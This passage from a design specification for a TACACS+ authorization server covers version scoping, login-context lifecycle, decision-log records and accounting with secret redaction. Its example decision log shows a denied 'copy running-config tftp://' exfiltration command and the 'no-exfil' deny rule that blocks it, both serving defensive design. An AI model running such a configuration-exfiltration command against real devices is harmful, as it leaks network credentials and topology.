security-relevant** — whoever can edit `os_version` can lift a mitigation without touching
policy, and that field is often written by a discovery tool rather than a person. Version
data used for security scoping SHOULD come from an attested path.

### Version comparison

`lt` and `gte` on a version string use one generic comparator. Vendor version strings are not
semver — `21.4R3-S5`, `4.31.2F`, `10.2(5a)`, `15.2(4)E10` — and a semver library would
actively mis-order them, since semver treats a suffix after a dash as a *pre*-release and
would sort Junos service release `21.4R3-S5` **below** `21.4R3`.

Instead, tokenize into runs of digits and runs of letters, discarding separators
(`.`, `-`, `(`, `)`, `_`, `/`), upper-casing letters, then compare element by element:

| Comparison | Rule |
|---|---|
| digit run vs digit run | numeric |
| letter run vs letter run | **equality only** — never alphabetical, since `M > F` is meaningless |
| letter run vs digit run | incomparable |
| one sequence is a prefix of the other | the shorter is lower |

```
21.4R2-S9  → (21,4,R,2,S,9)
21.4R3     → (21,4,R,3)         position 3: 2 < 3   → R2-S9 is older
4.31.2F    → (4,31,2,F)
4.31.10F   → (4,31,10,F)        position 2: 2 < 10
17.09.04a  → (17,9,4,A)
17.09.04   → (17,9,4)           shorter is lower    → the rebuild is newer
10.2(5a)   → (10,2,5,A)
```

**An incomparable version is treated exactly as a missing one**, resolving through
`on_missing` — included in a deny-bearing scope, excluded from a permit-bearing one. If it
cannot be determined whether a device is patched, it is assumed not to be. This requires no
per-vendor configuration and fails in the safe direction.

Letters are compared by equality because their meaning is vendor-specific: in Arista's scheme
`F` and `M` mark lifecycle stage within one train, while Cisco's `E` and `S` are separately
built trains that are genuinely not orderable.

**Letters are reached only when every preceding number is equal**, which makes incomparability
rare in practice. Arista increments the third digit across the F-to-M transition, so
`4.31.5M` versus `4.31.2F` resolves at position 2 — `2 < 5` — and the letters never enter into
it. The genuine collision is `15.2(4)E10` versus `15.2(4)S10`, where the numeric prefixes match
and position 3 is `E` against `S`; refusing there is correct, because those are different code
bases rather than different points on one line.

**That cost MUST be visible.** Any scope resolving a version comparison MUST report the
devices it included because comparison failed:

```
srx_unpatched: 47 devices
  ⚠ 3 included because their version could not be compared to "21.4R3-S5"
      srx-fw-22 (21.4X75-D40), srx-lab-01 ("unknown"), srx-fw-31 (21.2R1-EVO)
```

The remedy is then obvious — an explicit version list, a regex, or exclusion by another
attribute. Silent inclusion is what makes this dangerous; reported inclusion makes it
ordinary.

Exact and regex matching on version strings remain available and require no comparator.

CI SHOULD report a scope that has matched no devices for an extended period — a mitigation
whose population has emptied is dead code, and saying so is how policy cleans itself up.

---

### 5.6 Login context lifecycle

**Creation.** Login context is created **only on successful token redemption**, by the
daemon, keyed `(nas, username)`. Nothing else creates it. A session port49 did not
authenticate therefore has no context and is denied — which is correct, since port49 has no
basis on which to authorize it.

The shape is given in §5.1.1; §5.1.4 covers the credential fields.

**`port` and `rem_addr` are recorded attributes and are part of no key, on every platform.**
They are written into the context as the device presented them at authentication, logged on
every record, and used to annotate accounting. Neither is ever looked up on. The measurement
that forced this is in §15 (L1): on no platform in the lab is `port` the same value at
authentication and at authorization.

**One operator, one device, one context.** The accepted cost of this key is that a second
login by the same username on the same device overwrites the first login's context with an
identical-content context under a new `ctx_id`. Same principal, same privilege, same blob, so
nothing is authorized that was not already authorized — but the older shell now logs the
newer `ctx_id`, and a log reader cannot tell the two apart. No wire field distinguishes them
(§15, L1), so this is unavoidable rather than merely unfixed. The overwrite MUST therefore be
logged: the `redeem` record that performs it carries `session.replaced_ctx_id`, the `ctx_id`
it displaced, so the reader at 3am sees "second login by alice on ls01, context replaced"
rather than silence, and can join the older shell's records to the newer ones.

**Bound attributes.** `username` is in the key, so a context is only ever found by the name
that created it. `rem_addr` is recorded at creation and compared where the wire username is
not the principal:

| Exchange | Check |
|---|---|
| command authorization | the key *is* the username, so a request under another name finds no context and is denied `context_missing`, not `username_mismatch` |
| enable, `enable_username: principal` | the key is the username, as above |
| enable, `$enab{level}$` platforms | resolved through the `(nas, rem_addr)` secondary index; `rem_addr` MUST match, and an index entry resolving to more than one context MUST refuse rather than guess |

**The username on the record the store returns MUST be re-checked against the one the lookup
asked for**, on the command path and on the accounting path alike, and a mismatch MUST deny
rather than authorize. The key already selects on it, so a correct store can never fail this;
it is a guard against one that answers with a record it was not asked for. Without it a store
fault yields a permit evaluated against another principal's context, and an accounting record
that names the wrong principal — silently, because the record takes its username from the wire
and its principal from the context and would assert the two belong together. This mirrors the
credential-hash re-check the receipt path performs after its own lookup (§5.1.4).

`username_mismatch` (§5.7) is therefore reachable two ways and not from a stranger's command,
which is `context_missing`: on the enable path above, where the username is resolved from
context rather than read off the wire and can genuinely disagree with it, and as the
store-fault guard just described. The `$enab{level}$` path itself stays **unexercised and
provisional**, and as of 2026-09-20 that is for a different reason than it was: IOS-XE, the
platform the spelling comes from and the one L3 was waiting on, has been measured and sends the
**operator's own username** on the enable START (§15, L3; `tests/lab/results/L3-cisco_iosxe.md`).
No device in this lab has been observed sending `$enab{level}$` at all, so the path has no
measurement behind it rather than an untested platform.

#### port49 denies commands; it cannot end a session

There is no server-to-device disconnect in TACACS+. Every mechanism below stops port49
*authorizing* — the TCP session stays up, a candidate configuration stays intact, an
in-progress commit is untouched. "Teardown" throughout this document means discarding state,
never dropping a connection. That bounds the worst case of every rule here: an operator is
told no, not cut off.

#### Teardown, ordered by authority

Earlier drafts listed triggers by *reliability* and let all of them delete state. That was
wrong. The bindings above are the security control; teardown is state hygiene. A signal port49
did not generate and cannot verify MUST NOT delete state.

| | Trigger | Authority |
|---|---|---|
| 1 | **Login redemption** on the same `(nas, username)` | port49 performed it — overwrites unconditionally, and logs the overwrite (above). An `enable` redemption is not this: it updates `privilege` in place and keeps `ctx_id` (§7). **That is a requirement on plan 2's escalate path, not a description of the tree** — see below |
| 2 | **Revocation** — OIDC back-channel logout by `sid` or `sub`; a certificate appearing on a CRL or OCSP response by issuer and serial; a policy change withdrawing every grant | authoritative, from the identity layer (§5.1.4). Sets `revoked_at` rather than deleting, so the next command is denied `credential_revoked` with a `server_msg` saying so — distinguishable from a session port49 never saw. Row 6 reclaims the state |
| 3 | **Session ceiling** — `session_expires` reached and the grace window elapsed | local, needs no external signal |
| 3a | **Staleness ceiling** — `now - refreshed_at` beyond `staleness_ceiling` because the broker has been unreachable that long (design document §9) | local; denies `context_stale` with a `server_msg` naming the broker outage, retains the context so recovery resumes it |
| 4 | **Username mismatch** on an enable exchange resolved through `(nas, rem_addr)` | a genuine conflict — denies and invalidates. On the command path this cannot arise: the username is the key |
| 5 | — | **withdrawn 2026-09-20.** It read "authentication START on the same `(nas, port)` under a different username, including one port49 rejects". Under `(nas, username)` a START under a different username addresses a different context and is evidence of nothing about this one, so the row had no content left to carry. Deleting a live operator's context because someone else mistyped a name on the same device is exactly the mutual lockout the re-key removed |
| 6 | **Idle TTL** | hygiene; bounds abandoned state |
| 7 | **Exec accounting** | **advisory only — annotates, never deletes** (§5.8) |

**Row 1's enable clause is not what plan 1 does.** Plan 1 has no escalate path: its `redeem`
does not distinguish an enable START from a login START, so it mints a fresh `ctx_id` and
writes it over the login context. Under `(nas, username)` that lands on the operator's own
login context on any platform that puts their real username on the enable START — which vEOS
does, measured (`tests/lab/results/L3-arista_eos.md`). Measured on vEOS 2026-09-20, one
operator's whole sequence:

```
redeem            permit token_redeemed   port=ssh   priv=1   ctx=QOZ6DYFB
authorize_session permit context_matched  port=vty4  priv=1   ctx=QOZ6DYFB
redeem            permit token_redeemed   port=vty4  priv=15  ctx=TVGMSVTY  replaced_ctx_id=QOZ6DYFB
```

`session.replaced_ctx_id` is what surfaced it. Nothing breaks today — authorization resolves
against the new context because the lookup is by username, and plan 1's authorizer reads no
field of the context — but the log join across an escalation depends on `replaced_ctx_id`
rather than on a stable `ctx_id`, and the converse holds too: a second *login* START carries
`priv_lvl=1` and writes it over an enabled context, so once the policy engine reads
`privilege` this oscillates both ways. Keeping `ctx_id` across an escalation, and updating
`privilege` in place, is **plan 2's work**.

**Why accounting was demoted.** It is best-effort, device-generated, and delivered on a
separate connection that can be queued or bounced off another server first. A delayed logout
STOP therefore arrives after the line has been reused:

```
t0   Bob's session on ls01 ends
t1   device emits  STOP user=bob port=vty0 task_id=42   → delayed 4s
t2   Bob reconnects, redeems, ctx:(ls01, bob) = { bob, … }
t3   the delayed STOP arrives  →  teardown fires on (ls01, bob)
t4   Bob's next command  →  context_missing  →  denied mid-session
```

Fail-closed, so not dangerous — but a self-inflicted outage, and one whose two halves look
unrelated in a log. The `(nas, username)` key removes the Bob-then-Alice version of this and
not this one, Bob reconnecting. Rather than patch it, accounting now sets
`accounting_state: closing` and nothing
more — it is reported, and it has **no effect on refresh, authorization, or teardown**; row 6
reclaims the state. §5.8 specifies the annotation, including the `task_id` binding that makes
it correct.

**Idle TTL is a backstop, not a control.** It SHOULD be extended by activity. A short TTL was
previously doing security work it cannot do — it narrows a window without closing it, while
denying idle operators mid-session with `context_missing`. Rows 1 through 4 close the window.

#### Where these controls do not reach

Every mechanism in this section acts at the *next authorization request*: a ceiling denies a
command, revocation deletes context so the next command is denied, a username mismatch denies
and invalidates, and the ceiling warning rides on an authorization REPLY. A platform that
authorizes only at login — `supports: [session]`, Junos foremost — asks port49 once and never
again. On such a platform, and on any privilege tier a device does not authorize (§9):

- a back-channel logout, a CRL entry, or a withdrawn grant reaches a context nobody will read;
- `session_expires` passes and nothing changes on the device;
- there is no REPLY to carry `server_msg`, so no warning is delivered.

Post-login control there is bounded by the device's own session, and port49 can neither warn
nor revoke. This MUST be stated rather than implied: `port49 explain` MUST say so when asked
about revocation or a ceiling on such a platform, exactly as it must for `pipe_authorized:
false`. Two levers exist and both are used. The adapter renders the class `idle-timeout` from
`max_session_age`, which is an approximation but an enforced one. And every revocation record
names the live contexts it could **not** reach, so an incident responder knows which devices
still need a manual disconnect.

#### Session lifetime

`session_expires` is `auth_time + max_session_age`, where `auth_time` is when the human
actually authenticated (§5.1.4) and `max_session_age` is port49 policy, declared per role,
composed as the **minimum** across a principal's roles, carried in the token record (§5.1.1),
and defaulting long. It is the compliance-relevant clock: *how long may a session run on the
strength of one authentication event.*

A session approaching the ceiling is **warned in the session**. The authorization REPLY
carries `server_msg`, which devices display, so the operator is told on the device before
anything stops working — and re-authentication does not require reconnecting, because the
broker can refresh live context (§5.1.3) through the `contexts_by_principal` index:

```
t+0h00   Alice authenticates (OIDC, amr=["pwd","mfa"]), mints, logs into core-sw01
         ctx { auth_time=T, session_expires=T+8h }

t+7h50   authorization REPLY carries server_msg:
           "port49: re-authenticate within 10m — run `port49 login`"

t+7h55   Alice runs `port49 login`; a fresh authentication event (prompt=login, MFA),
         the agent calls /v1/refresh, the broker takes auth_time=T2 from the new
         assertion, finds her live contexts through contexts_by_principal, writes
         session_expires=T2+8h and refreshed_at, and re-indexes contexts_by_sid
         under the new assertion's sid so a later back-channel logout still lands

t+7h56   her next command authorizes normally — no reconnect, candidate config intact
```

Past the ceiling, commands are denied with a `server_msg` naming the reason, and **context is
retained through a grace window** so a late `port49 login` resumes the session rather than
forcing a reconnect. Requirements:

- The warning window MUST be long enough to complete a change, not merely to notice the
  message. It and the grace window are both configurable.
- Refresh MUST NOT extend a session whose principal has lost the grant; refresh re-resolves
  policy, so a withdrawn grant produces a blob that denies.
- Denial at the ceiling is FAIL, not ERROR. Whether that closes off fall-through to local
  authorization is a property of the device's configuration, not of the protocol, and it is
  measured only for *authentication*: on both Junos images a FAIL falls through to the local
  password whenever `password` is in `authentication-order`, while vEOS and the N9Kv treat a
  FAIL as final under every method list tested (`tests/lab/results/L4-juniper_vsrx.md`,
  `L4-juniper_vjunos-router.md`, `L4-arista_eos.md`, `L4-cisco_nxos.md`). Authorization
  fall-through is unmeasured on every platform. What closes the window is the reference AAA
  configuration per platform, which the lab register tracks as L4.
- `max_session_age: never` MUST be expressible. Some deployments have no such requirement,
  and a ceiling nobody asked for is an outage waiting to happen. The default is **12h**; a
  compliance parameter with an unstated default is one nobody sets.
- **Refresh MUST be a fresh authentication event, and `auth_time` MUST come from the
  assertion.** An OIDC client holding a refresh token can obtain a new ID token silently, and
  the identity provider will correctly report the *original* `auth_time` — nobody re-proved
  anything. The agent therefore requests `prompt=login` (or `max_age=0`) on refresh, and the
  broker takes `auth_time` from the assertion, never from its own clock; if it did, the
  ceiling would measure time since a CLI command ran rather than time since identity was
  proven. On the certificate path there is no assertion and no re-handshake — TLS 1.3 has no
  renegotiation — so refresh is an application-level challenge over the held connection: the
  broker sends a nonce, the agent signs it with the certificate's key after a fresh hardware
  touch where the key is on a token, and `auth_time` is the broker's verification time. That
  is the one place the broker's clock is the source, and it is a time at which possession was
  just proven.

#### Why `enable: auto` is restricted

Method lists fall through to a later method only on **ERROR** (the server is unreachable), not
on **FAIL** (an explicit reject). So a session that authenticates locally rather than through
port49 implies port49 was *unreachable at that moment*, so port49 never saw the START and
holds no context for that occupant. (Until 2026-09-20 this sentence turned on teardown row 5,
which withdrew with the re-key; the exposure below does not depend on it.)

That fall-through is itself a configuration property rather than a protocol one: measured, a
FAIL is final on vEOS and the N9Kv under every method list tested, and falls through to the
local password on both Junos images whenever `password` is in `authentication-order`
(`tests/lab/results/L4-*.md`). So on Junos a local login can follow a port49 denial as well as
a port49 outage, which widens the window this section prices.

The remaining exposure is therefore: port49 unreachable when a session begins, reachable again
by the time that session issues `enable`, on a platform whose enable exchange carries
`$enab{level}$` rather than the principal. The stale context resolves and the new occupant
inherits the previous user's ceiling.

**`enable: auto` MUST NOT be available on a platform whose `enable_username` is not
`principal`.** Granting it there is a policy load error. Those platforms use `enable: token`
or `enable: none`, both of which require a credential the previous occupant's context cannot
supply. `rem_addr` comparison covers the same case as defense in depth, and a mismatch is a
high-signal event worth alerting on.

**Blast radius when it does occur** is limited by the key itself: the escalated occupant
obtains an elevated shell, but every command they run arrives under *their own* username,
which is the lookup key, so it finds no context of theirs and is denied `context_missing`.
(Before 2026-09-20 the same commands landed on the stale context and were denied
`username_mismatch`; the deny is unchanged, the reason code is not.) Whether that denial then
falls through to local *authorization* is unmeasured on every platform — the L4 measurements
cover authentication only — so it is the device's reference AAA configuration that must close
that path, not the FAIL itself. The escalation converts into real access only on devices
where command authorization does not cover that privilege tier, which is precisely what the
accounting reconciliation in §9 exists to surface.

**Local account names MUST NOT collide with device-facing usernames.** A device-local `bob`
that is not the port49 username `bob` matches on username and inherits the context. The
reference AAA configuration MUST require disjoint namespaces for break-glass and local
accounts, and port49 SHOULD warn when it observes a local fallback succeed for a username it
knows.

#### Gated on the lab

Four claims in this section rest on device behavior that has not been measured. They are
entries in the lab register (§15) and are cited by ID rather than restated: **L1** (`port`
contents per platform and transport), **L3** (`rem_addr` on the enable START), **L4**
(method-list fall-through on FAIL, and `deadtime`), and **L2** (`server_msg` display). Until
L4 is closed, the fall-through argument above is a requirement on the reference AAA
configuration, not a fact about the protocol.

---

### 5.7 The decision log

Every evaluation emits exactly one record. This is port49's own stream, produced by the
component that made the decision, and it is distinct from the accounting records a device
sends — those report what a device *did*, after the fact, only for the tiers it was
configured to report. The decision log records what port49 *decided*, for whom, and against
which rule. It is complete by construction, because every decision passes through us.

> **A decision record must be replayable.**

Blobs are content-addressed and immutable (§5.1.2). A record that names its blob can be
re-evaluated offline and must produce the same verdict. "Why" is therefore not prose port49
wrote at decision time — it is something a reader can verify.

A deny at the per-command point:

```json
{
  "ts": "2026-09-04T02:11:07.412Z",
  "event": "authorize_command",
  "verdict": "deny",
  "reason": "no_permit_dominates_deny",
  "principal": "user:alice@example.com",
  "auth": { "method": "oidc", "credential_sha256": "9f2c8b…" },
  "device": { "nas": "10.20.0.7", "name": "core-sw01", "platform": "arista_eos" },
  "session": { "ctx_id": "01J9F3QK…", "port": "vty0", "rem_addr": "198.51.100.4", "privilege": 15 },
  "request": {
    "service": "shell",
    "raw": ["service=shell", "cmd=copy", "cmd-arg=running-config", "cmd-arg=tftp://10.9.9.9/x"],
    "vector": ["copy", "running-config", "tftp://10.9.9.9/x"]
  },
  "policy": {
    "bundle": 2291,
    "blob": "sha256:a3f9c1…",
    "matched_deny":    { "rule": ["*", "*", "/^tftp:/"], "specificity": [1,1,2], "role": "no-exfil" },
    "matched_permits": [{ "rule": ["copy", "**"],        "specificity": [3,0,0], "role": "net-operator" }]
  }
}
```

The record answers the question without anyone reading port49's source: Alice held a permit
for `copy`, a deny matched the destination more specifically, and dominance failed.

#### Three properties

**Log inputs and policy identity, not a narrative.** The matched rules are included because
they make a record readable on its own, but the blob hash is what makes it provable. A replay
that disagrees with the logged verdict is itself a finding — version skew, or tampering — so
`bundle` and `blob` are mandatory on every record that consulted policy.

**Keep the raw arguments alongside the normalized vector.** Normalization (§3) is where
matcher bugs live. A record holding only the vector erases the evidence of its own
normalization bug, and the two together are what make a projection or abbreviation defect
diagnosable from logs rather than reproducible only in a lab.

`request.service` is the `service` AV pair lifted out of `raw`, on every `authorize_session`
and `authorize_command` record including the denials. It is there so "which service did this
fleet's devices actually ask under" is a field to group by rather than a string to parse out
of an array — the question an operator has after renaming `tacplus-options service-name` on
half an SRX fleet, and the one a `service_unsupported` denial has to answer. It is recorded,
never consulted for policy (§5.2).

**Never suppress permits.** Sampling, or logging denies only, looks thrifty and destroys the
artifact: *what did Alice run on Tuesday* is answered entirely by permits. Volume is the cost
of the product, not a problem to optimize away.

#### Events

One envelope. Five decision events, one at each point a decision is made, plus two report
events (`account`, `blob`) that share the envelope and carry no verdict:

| `event` | Emitted by | Decides |
|---|---|---|
| `mint` | broker | which grants matched, which roles composed, which blob resulted |
| `redeem` | daemon | whether a presented credential is valid, and creates the context |
| `authorize_session` | daemon | the session and its returned attributes (§6) |
| `authorize_command` | daemon | one command vector |
| `escalate` | daemon | an `enable` exchange, attributed to the principal (§7) |
| `blob` | broker | not a decision: the full compiled blob, emitted once per hash so replay depends on the log alone (§5.1.1) |

Device accounting shares this envelope as the seventh event, `account`, and is specified in
§5.8. It is not a decision — it is a report — so it carries no `policy` block and no verdict.

`escalate` exists as its own event because the device-facing username on those platforms is
`$enab{level}$`, not a person. The record carries the principal resolved from login context,
which is the only place that attribution is recoverable.

A `mint` record is the audit trail for *authority*, where the others are the trail for *use*:

```json
{
  "ts": "2026-09-04T02:04:55.108Z",
  "event": "mint",
  "verdict": "permit",
  "reason": "grants_matched",
  "principal": "user:alice@example.com",
  "auth": { "method": "oidc", "credential_sha256": "9f2c8b…" },
  "policy": {
    "bundle": 2291,
    "subject": "network-operators",
    "grants": [{ "scope": "campus", "roles": ["net-operator", "no-exfil"], "expires": null }],
    "blobs":  { "arista_eos": "sha256:a3f9c1…", "cisco_nxos": "sha256:77b0de…" }
  },
  "scope": { "devices": 412, "ttl_seconds": 900 }
}
```

#### Reason codes

`reason` is a closed vocabulary, so denials are countable and alertable without parsing prose:

| `reason` | Meaning |
|---|---|
| `grants_matched` | `mint`: at least one declared grant selected the device; blob written |
| `no_grants_matched` | `mint`: no declared grant for this principal selects the device |
| `username_collision` | `mint`: the derived username is already held by a subject in another trust domain (§2) |
| `trust_domain_unresolved` | `mint`: no configured verifier accepted the credential (design document §7) |
| `context_matched` | `authorize_session`: context found, attributes returned |
| `escalation_granted` | `escalate`: the level was within `max_privilege` and the mechanism succeeded |
| `permit_dominates` | a permit dominated every matching deny (§5.4) |
| `pipe_stage_denied` | a pipeline stage matched no pipe permit (§4) |
| `service_unsupported` | the authorization `service` is not one the platform authorizes; on `redeem`, the authentication action or type is not one port49 serves (only `login` with ASCII, PAP, or CHAP) and the reply is `ERROR` |
| `store_unavailable` | any event: the store did not answer or returned an error; the reply is `ERROR` so the device falls through to its next method (design document §12) — the log line is the evidence an operator needs at 3am |
| `token_redeemed` | `redeem`: a presented credential matched an unspent token |
| `token_not_found` | `redeem`: the device tag matched but no unspent token for `(nas, username)` did — expired, spent, or mistyped |
| `device_mismatch` | `redeem`: the presented token's device tag is not this device's (design document §8) — PAP and ASCII only; under CHAP the tag is not visible and the outcome is `token_not_found` |
| `credential_mismatch` | `redeem`: the receipt the store returned does not carry the credential hash the lookup asked for. Since 2026-09-20 the hash is *in* the receipt key (§13, decision 15), so a differing credential finds no receipt and redeems normally instead; this reason now covers only a store that answered with a record it was not asked for, which is a store fault and never a normal outcome |
| `receipt_replayed` | `redeem`: a byte-identical retransmission replayed the stored decision |
| `token_kind_mismatch` | `redeem`/`escalate`: a login token presented at `enable`, or the reverse (§7) |
| `enable_refused` | `escalate`: the subject's mechanism is `none` |
| `ceiling_exceeded` | `escalate`: the requested level is above `max_privilege` |
| `no_rule_matched` | nothing matched; deny by default |
| `no_permit_dominates_deny` | a deny matched and no permit dominated it |
| `context_missing` | no login context for `(nas, username)` — port49 did not authenticate this session under that name |
| `username_mismatch` | the request's username differs from the one bound at redemption (§5.6). Reachable two ways, and a request under a name port49 never authenticated is neither of them — that is `context_missing`, because the username is the key. First, wherever the username is resolved from context rather than read off the wire: the `$enab{level}$` enable path through the `(nas, rem_addr)` index. Second, as a **store-fault guard** — the context lookup selects on the username, so a store answering with another principal's record fails the re-check that follows it and is denied rather than authorized. A correct store never produces the second |
| `rem_addr_mismatch` | enable arrived from a different address than the bound one |
| `privilege_exceeded` | the request is above the session's granted level |
| `session_expired` | the session ceiling was reached; context retained through the grace window (§5.6) |
| `context_stale` | the broker has been unreachable past `staleness_ceiling`; context retained, denies until refreshed (§5.1.1, design document §9) |
| `credential_revoked` | the context's `revoked_at` is set — CRL, OCSP, back-channel logout, or every grant withdrawn (§5.6) |
| `device_unknown` | the source address is not in the admission trie (§10) |
| `platform_unknown` | the device's platform has no adapter; generic fallback applied |
| `blob_unavailable` | the referenced blob could not be resolved from the store or any cache — a store fault, alarmed (§5.1.1) |
| `device_quarantined` | the device is in inventory but failed joint validation against policy (§10); the connection is closed without a reply, as for `device_unknown`, until fixed |

Every event has a success reason and at least one failure reason in this table, so
"decisions by event, verdict, and reason" (design document §15) is a complete metric. A
denial whose reason is `context_missing`, `context_stale`, `device_unknown`, or
`blob_unavailable` is an operational condition rather than a policy outcome, and each MUST be
separately alertable — a rise in `context_missing` means sessions are being authenticated
somewhere other than port49, and any `context_stale` means the broker has been down longer
than the ceiling. `credential_revoked` MUST be alertable on its own: a revoked operator still
typing is an incident signal. `session_expired` is a further category: expected, and a signal
that the re-authentication warning is not reaching operators (§5.6).

#### Credentials never appear

The log MUST NOT contain a token, a password, a CHAP challenge or response, or any value from
which a credential can be recovered. The credential is identified by `credential_sha256`
only — the same hash the receipt binds (§5.1.1), which is what lets a retransmission be
recognized in the log as one decision retried rather than two decisions made.

#### Replay

`port49 policy replay <record>` re-evaluates a record against the blob it names and reports
agreement or divergence. It is the same evaluator the daemon runs, so a divergence is real.
Three uses:

1. **Answering an auditor** — reconstruct a decision from the record alone.
2. **Regression testing** — replay a captured corpus against a candidate build; any verdict
   that changes is either an intended fix or a regression, and both must be explained.
3. **Integrity checking** — a record whose replay disagrees indicates the log or the blob
   store has been altered.

Replay requires the blob, so the blob is in the log: a `blob` event carrying the full compiled
content is emitted once, when the broker first writes it (§5.1.1). Replay reads the log alone,
the store owes the auditor nothing, and the blob a record names sits in the same
tamper-evident stream as the record. Blobs are small, immutable, and shared across every login
that resolved to the same policy, so the log cost is one event per policy version per platform.

#### Correlation

Every record resolved against a login context carries its `ctx_id` (§5.1.1). A `mint` record
carries `token_sha256` per minted token instead — never the token — since context does not
exist yet; the daemon's redemption record carries the same hash beside `credential_sha256`
(they differ under CHAP) and joins the two. One chain therefore runs from an SSO login to a
typed command:

```
mint (token_sha256) → redemption (token_sha256 → ctx_id) → authorize_session
                                             → authorize_command ×N
                                             → escalate
                                             → account ×N          (§5.8)
```

---

### 5.8 Device accounting

Accounting is the third exchange in TACACS+ and the only one where the device reports rather
than asks. A record says *I did this*. There is no deny status in the reply, and the device
has already acted by the time it arrives.

Three record types, distinguished by a flags octet: START, WATCHDOG (still running), STOP.
A login, one command, and a logout — three separate exchanges, each acknowledged:

```
flags=START     user=alice  port=vty0  rem_addr=198.51.100.4  priv_lvl=1
  task_id=42  service=shell  cmd=  start_time=1757041495
        → REPLY status=SUCCESS

flags=STOP      user=alice  port=vty0  rem_addr=198.51.100.4  priv_lvl=15
  task_id=43  service=shell  cmd=show  cmd-arg=running-config  cmd-arg=<cr>
  start_time=1757041502  stop_time=1757041502
        → REPLY status=SUCCESS

flags=STOP      user=alice  port=vty0  priv_lvl=1
  task_id=42  service=shell  cmd=  elapsed_time=214
        → REPLY status=SUCCESS
```

Note the shape: an empty `cmd` marks the exec records — session start and session end —
exactly as it marks session authorization (§5.2). Command records are STOP-only, since a
command that already ran has no start to report.

#### What accounting is not

**It is not a complete record of what ran.** A device sends only the classes it was
configured to send. `aaa accounting commands 15` alone means every privilege-1 command is
invisible; console sessions, out-of-band access, and local-fallback logins produce nothing at
all. Silence is not evidence of inactivity, which is the whole reason §9 exists — the gap
between what port49 authorized and what it was told ran identifies tiers a device executes
without asking anyone.

**It is not enforcement, and MUST NOT be made to act like it.** Authorization and accounting
are separate exchanges; a device that cannot account still runs the command. Any attempt to
gate access on a successful accounting write is theatre that costs availability and buys
nothing.

**It is not trusted input.** Records are device-generated and unverifiable. They are recorded
and reported; they never delete state (§5.6) and never grant anything.

#### Destination

**Accounting shares the decision log's envelope, emitter, and sink**, as `event: "account"`.
The two streams are joined constantly — reconciliation, audit, incident review — and
splitting them means every consumer reassembles them. Default sink is JSON lines on stdout,
so a deployment's existing log pipeline handles retention, indexing, and shipping.

Accounting MUST NOT be written to the token store. The store is the only shared state and the
only single point of failure (design document §6), and accounting is the highest-volume
traffic port49 handles.

```json
{
  "ts": "2026-09-04T02:11:42.006Z",
  "event": "account",
  "flags": "stop",
  "attribution": "resolved",
  "principal": "user:alice@example.com",
  "device": { "nas": "10.20.0.7", "name": "core-sw01", "platform": "arista_eos" },
  "session": { "ctx_id": "01J9F3QK…", "port": "vty0", "rem_addr": "198.51.100.4" },
  "task_id": "43",
  "record": {
    "raw": ["task_id=43", "service=shell", "cmd=show", "cmd-arg=running-config", "cmd-arg=<cr>"],
    "vector": ["show", "running-config"],
    "priv_lvl": 15,
    "start_time": 1757041502,
    "stop_time": 1757041502
  }
}
```

`raw` and `vector` follow the same rule as the decision log: the record as received, plus the
normalized form the reconciliation join uses.

#### Durability

Reply `SUCCESS` once the record is durably handed to the local spool; reply `ERROR` only when
the spool cannot take it. RFC 8907 offers nothing else — there is no way for a server to
refuse a record on policy grounds.

`ERROR` means *not me, ask another replica*. Devices are not known to retry to the same
server, but most fall through to the next server in the group, which is the correct outcome
when this replica genuinely cannot record. It MUST NOT be used for anything else: an `ERROR`
returned for a malformed or unwelcome record makes every replica in turn try to accept it and
loses the record anyway.

The spool is a bounded local buffer with a disk-backed overflow, drained to the sink. Sizing,
and whether overflow blocks or discards oldest-first, are deployment settings. Spool depth and
drop count MUST be metrics — an accounting stream silently discarding records destroys the
reconciliation report without failing anything visibly.

#### Two wire details that break the join

**Strip the trailing `cmd-arg=<cr>`.** Several vendors terminate the argument list with a
literal `<cr>`. It is not an argument, and left in place every reconciliation join misses by
one position and every command looks unauthorized. Normalization (§3) removes it; the raw
record keeps it.

**Redact secrets before emit.** Command accounting carries typed text verbatim, so
`username bob secret Hunter2` arrives in full. This is the well-known way TACACS+ accounting
logs fill with plaintext passwords, and it is worse here than in a conventional deployment
because port49's stream is designed to be shipped and retained.

Platform adapters therefore declare redaction patterns, applied before emit:

```yaml
# platforms/arista_eos.yaml
redact:
  - {match: ['username', '*', 'secret', '**'],        from: 3}
  - {match: ['username', '*', 'password', '**'],      from: 3}
  - {match: ['enable', 'secret', '**'],               from: 2}
  - {match: ['**', 'key', '*'],                       from: -1}
```

Redaction replaces argument *values* with `«redacted»` and preserves the vector's shape and
length, so the reconciliation join still works on a redacted record. It applies to `raw` as
well — a rule that redacted only the normalized form would defeat itself.

Redaction is best-effort by nature and MUST NOT be presented otherwise: a pattern that misses
leaks. It is strictly better than emitting verbatim, and the honest mitigation is that
port49's own credentials are never typed at a device prompt in the first place.

#### Annotating login context

Exec accounting annotates context and never deletes it (§5.6). The context is found by
`(nas, username)` — the accounting record's own `user`, not its `port`, which is part of no
key (§5.6):

```
exec START for (nas, username):
    ctx has no session discriminator      →  bind it (our own session's START)
    otherwise                             →  annotate foreign_session, alert

exec STOP for (nas, username):
    discriminator set    →  accounting_state = closing, only on a discriminator match
    discriminator unset  →  accounting_state = closing, on the username alone
```

**What the discriminator is, is per platform, and `task_id` is not it.** This section used to
say `task_id` pairs a START with its STOP because "context is already keyed on `(nas, port)`,
so device-local uniqueness suffices". Both halves are now wrong: the key no longer contains
`port`, and `task_id` is measured **not** device-unique — on both Junos images it restarts at
`1` per session, so two concurrent logins both sent `task_id=1`
(`tests/lab/results/L1-juniper_vsrx.md`, `L1-juniper_vjunos-router.md`). What is measured to
work: `session_pid` on Junos, unique and stable across the device's immediate reuse of an
accounting `port`; `task_id` on EOS, device-unique and monotonic
(`tests/lab/results/L1-arista_eos.md`). Choosing per platform is adapter work and is
specified with the adapters, not here.

The unset branch covers `stop-only` accounting and a lost START. `closing` is reported and
nothing else — it does not stop refresh (§5.1.3), because a STOP from a previous session on the
same line under the same username would otherwise mark a live session closing and let the
staleness ceiling deny it later, which is the demotion's own defect in slow motion. Any later
authorization or START on the context clears it. The idle TTL reclaims the state. A record
that matches neither is logged as unattributable to that context and left alone.

An exec START whose `user` does not match the bound username is a **session port49 did not
authenticate** — a local fallback, a console login, or a name collision. That is precisely the
condition §5.6 requires a warning for, and it is high-signal: it means either port49 was
unreachable or a device-local account shares a principal's name.

#### Unresolvable records

A record port49 cannot tie to a context — no `ctx_id`, no principal — is still recorded, with
`attribution: "unattributed"` and `ctx_id: null`. It is never discarded. This is the primary
evidence that something authenticated outside port49, and a rate of unattributed records
above the deployment's break-glass baseline MUST be alertable.

